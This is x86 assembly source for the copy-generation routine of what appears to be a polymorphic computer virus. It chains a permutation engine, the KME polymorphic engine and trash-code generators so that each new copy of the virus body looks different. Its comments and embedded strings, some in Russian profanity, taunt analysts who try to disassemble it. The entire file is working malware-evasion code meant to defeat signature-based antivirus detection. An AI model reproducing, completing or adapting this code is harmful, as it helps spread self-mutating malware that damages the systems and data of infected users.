
;                                               дисассемблируй, трассируй -
;                                               все равно получишь хуй...

; ACTION: generate new polymorphic copy

; resulting buffer    -- buf
; size                -- buf_size
; relative entrypoint -- buf_entry

KME_ADD_FLG             equ     0               ; FLAG_DEBUG

gen_copy:               pusha
                        cld

                        debugmsg gencopy

                        push    offset ldetbl   ; initialize LDE32
                        call    disasm_init

                        xor     eax, eax
                        mov     mem_count, eax
                        mov     fucking_stack, eax

; ---------------------------------------------------------------------------

; generate internal trash --> tmp

                        xor     eax, eax
                        mov     t1_size, eax

                        if_first __noskip2
                        rnd     7
                        jz      __skip2
__noskip2:

                        debugmsg mut2

                        fake

                        pusho   my_rnd
                        push    tmp_ptr
                        push    1024-16         ; maxsize
                        push    1000            ; max 1000 instructions
                        push    offset t1_size
                        push    REG_ALL         ; dst
                        push    REG_ALL         ; src
                        push    ETG_ALL-ETG_JMPS
                        call    etg_engine


__skip2:
                        downgrade __skipprcg
                        rnd     5
                        jz      __skipprcg
                        debugmsg prcg

                        mov     edi, tmp_ptr
                        add     edi, t1_size
;                       mov     al, 0cch
;                       stosb
                        call    prcg_engine
                        add     t1_size, eax
__skipprcg:

                        mov     edi, t1_size
                        add     edi, tmp_ptr
                        mov     al, 0e9h        ; jmp init
                        stosb
                        stosd                   ; will be patched later
                        sub     edi, tmp_ptr
                        mov     t1_size, edi

                        mov     delta_esp, edi

; ---------------------------------------------------------------------------

; permutate, current code --> tmp

                        downgrade __2

                        rnd     13
                        jnz     __2
                        if_first __2

                        lea     esi, start
                        mov     edi, tmp_ptr
                        add     edi, t1_size
                        mov     ecx, CODESIZE1
                        rep     movsb

                        pusho   init_nopoly
                        pop     eax
                        sub     eax, offset start
                        mov     oentry, eax

                        jmp     __skip1
__2:

                        xor     ebx, ebx        ; jmpprob=0
                        rnd     100
                        jz      __1
                        rnd     20-15+1         ; jmpprob=15..20
                        lea     ebx, [eax+15]
__1:

                        mov     edx, tmp_ptr
                        add     edx, t1_size

                        debugmsg mut1

                        xor     esi, esi
                        pusho   init_first
                        if_first __x2

                        pop     eax
                        pusho   init_nopoly

                        rnd     100
                        jz      __x2
                        inc     esi
                        pop     eax
                        pusho   init_std
__x2:

                        pop     eax
                        sub     eax, offset start

                        call    fillbody        ; fill empty space

                        fake

                        pusho   my_malloc
                        pusho   my_disasm
                        pusho   my_mutate
                        pusho   my_rnd
                        push    ebx             ; jmp-prob
                        push    0               ; extrelfix
                        push    -1              ; ofiller (-1=xparent)
                        push    offset oentry
                        push    CODESIZE1
                        push    edx
                        push    eax             ; ientry
                        push    CODESIZE1
                        push    offset start
                        call    engine

                        or      eax, eax
                        jz      __okey1

                        debugmsg rpmeerr, eax

                        jmp     __error
__okey1:
                        IFDEF   DEBUG_DUMP
                        pusha
IFDEF   USE_C
                        x_push  edx, c:\_rpme.tmp~
ELSE
                        x_push  edx, q:\proj-z5\src\_rpme.tmp~
ENDIF
                        mov     edx, esp
                        call    fcreate
                        x_pop
                        xchg    ebx, eax
                        mov     edx, tmp_ptr
                        add     edx, t1_size
                        mov     ecx, CODESIZE1
                        call    fwrite
                        call    fclose
                        popa
                        ENDIF

__skip1:
                        mov     eax, oentry             ; patch 'jmp init'
                        mov     ebx, t1_size
                        mov     ecx, tmp_ptr
                        mov     [ecx+ebx-4], eax

; randomly, skip all poly shit

                        or      esi, esi
                        jnz     __s1

                        debugmsg skipall

                        mov     esi, tmp_ptr
                        add     esi, t1_size    ; skip ETG's shit
                        mov     edi, buf_ptr
                        mov     ecx, CODESIZE1
                        mov     buf_size, ecx
                        rep     movsb
                        mov     eax, oentry
                        mov     buf_entry, eax

                        jmp     __genok

__s1:

; polymorphize (compress), tmp --> buf

                        debugmsg mut3

                        call    __getregbit1

                        mov     ecx, CODESIZE1
                        add     ecx, t1_size

                        push    mem_ptr
                        push    FLAG_NOJMPS+FLAG_NOLOGIC+KME_ADD_FLG
                        push    CMD_ALL
                        push    ebx
                        push    randseed        ; initial randseed #
                        push    -1              ; jmps if rnd(X)==0
                        push    offset buf_entry ; [output eip]
                        push    offset buf_size  ; [output size]
                        push    0CCh            ; output filler
                        push    CODESIZE2       ; output/max size
                        push    buf_ptr      ; output buffer
                        push    0               ; input eip
                        push    ecx             ; input size
                        push    tmp_ptr      ; input buffer
                        call    kme_main
                        jc      __kme_error
                        mov     eax, buf_size
                        add     fucking_stack, eax

                        debugmsg sizeis, buf_size

; polymorphize (compress), buf --> tmp

                        rnd     20
                        jz      __secondcomp

                        debugmsg mut4skip

                        mov     esi, buf_ptr
                        mov     edi, tmp_ptr
                        mov     ecx, buf_size
                        mov     tmp_size, ecx
                        cld
                        rep     movsb
                        mov     tmp_entry, ecx ; 0

                        jmp     __skipsecond
__secondcomp:
                        debugmsg mut4

                        call    my_rnd  ; process randseed

                        call    __getregbit2

                        push    mem_ptr
                        push    FLAG_NOJMPS+FLAG_NOLOGIC+KME_ADD_FLG
                        push    CMD_ALL
                        push    ebx
                        push    randseed        ; initial randseed #
                        push    -1              ; jmps if rnd(X)==0
                        push    offset tmp_entry ; [output eip]
                        push    offset tmp_size  ; [output size]
                        push    0CCh            ; output filler
                        push    CODESIZE2       ; output/max size
                        push    tmp_ptr      ; output buffer
                        push    0               ; input eip
                        push    buf_size        ; input size
                        push    buf_ptr      ; input buffer
                        call    kme_main
                        jc      __kme_error
                        mov     eax, tmp_size
                        add     fucking_stack, eax

                        debugmsg sizeis, tmp_size
__skipsecond:

; generate external trash --> buf

                        xor     eax, eax
                        mov     t1_size, eax

                        rnd     19
                        jz      __skip3

                        debugmsg mut5

                        pusho   my_rnd
                        push    buf_ptr
                        push    4096-16         ;
                        push    1000            ; max 1000 instructions
                        push    offset t1_size
                        push    REG_ALL         ; dst
                        push    REG_ALL         ; src
                        push    ETG_ALL-ETG_JMPS
                        call    etg_engine


__skip3:

; polymorphize -- jmps+logic, tmp --> buf

                        call    my_rnd  ; process randseed

                        xor     edx, edx        ; flags

                        rnd     13
                        jnz     __5
                        or      edx, FLAG_NOLOGIC
__5:
                        rnd     17
                        jnz     __6
                        or      edx, FLAG_NOJMPS
__6:

                        mov     ebx, randseed

                        mov     eax, t1_size
                        add     eax, 5
                        mov     ecx, CODESIZE2
                        sub     ecx, eax
                        add     eax, buf_ptr

                        xor     edi, edi
                        dec     edi

                        debugmsg mut6

                        or      edx, KME_ADD_FLG

                        push    mem_ptr
                        push    edx             ; flags
                        push    ebx             ; CMD_ALL
                        push    REG_ALL
                        push    randseed        ; initial randseed #
                        push    101             ; jmp if rnd(X)==0
                        push    offset buf_entry ; [output eip]
                        push    offset buf_size  ; [output size]
                        push    edi             ; output filler (-1=random)
                        push    ecx             ; output/max size
                        push    eax             ; output buffer
                        push    0               ; input eip
                        push    tmp_size        ; input size
                        push    tmp_ptr         ; input buffer
                        call    kme_main
                        jc      __kme_error
                        mov     eax, buf_size
                        add     fucking_stack, eax

                        mov     edi, buf_ptr
                        add     edi, t1_size
                        mov     al, 0E9h
                        stosb
                        mov     eax, buf_entry
                        stosd

                        mov     eax, t1_size
                        add     buf_size, eax
                        mov     buf_entry, 0

; ---------------------------------------------------------------------------

__genok:
                        debugmsg genok

                        clc

                        jmp     __quit

__kme_error:
                        debugmsg kmeerr

__error:
                        debugmsg generr

                        stc

__quit:

                        popa
                        ret


__getregbit1:           rnd     256
                        and     eax, not REG_ESP
                        xchg    ebx, eax
                        ret

__getregbit2:           rnd     8
                        xchg    ecx, eax
                        xor     ebx, ebx
                        inc     ebx
                        shl     ebx, cl
                        cmp     bl, REG_ESP
                        je      __getregbit2
                        ret

my_malloc:              mov     eax, [esp+4]
                        add     eax, mem_count
                        cmp     eax, MAXMEM
                        jae     __1
                        xchg    mem_count, eax
                        add     eax, mem_ptr
                        ret
__1:
                        debugmsg nomem

                        xor     eax, eax
                        ret

my_disasm:              push    dword ptr [esp+4]
                        push    offset ldetbl
                        call    disasm_main             ; lde32bin.inc
                        ret

; input: EDX=buf, bufsize=CODESIZE1

fillbody:               pusha

                        mov     edi, edx
                        cld

                        downgrade __ss

                        if_first __first

                        rnd     20      ; 1,2,3

                        downgrade __s1
                        dec     eax
                        jz      __fill1
__s1:
                        downgrade __s2
                        dec     eax
                        jz      __fill2
__s2:

__ss:

                        rnd     256
__stos:                 mov     ecx, CODESIZE1
                        rep     stosb

                        rnd     CODESIZE1-512
                        lea     edi, [edx+eax]
                        rnd     256
                        lea     ebx, [eax+256]
__rndfill:              rnd     256
                        stosb
                        dec     ebx
                        jnz     __rndfill

__exit:                 popa
                        ret

__first:                mov     al, 0
                        jmp     __stos

; empty space in the permutation buffer will be sometimes filled with the
; following "messages": (must be dword-alogned)

                               ;12341234123412341234123412341234123412341234
__fill1:                call    __filln
                        x_stosd кончай|меня|дизасмить,сука||
                        retn
__fill2:                call    __filln
                        x_stosd still|trying|to|disasm|me?||
                        retn

__filln:                pop     edx
                        lea     ecx, [edi+CODESIZE1]
__fillcycle:            call    edx
                        cmp     edi, ecx
                        jb      __fillcycle
                        jmp     __exit
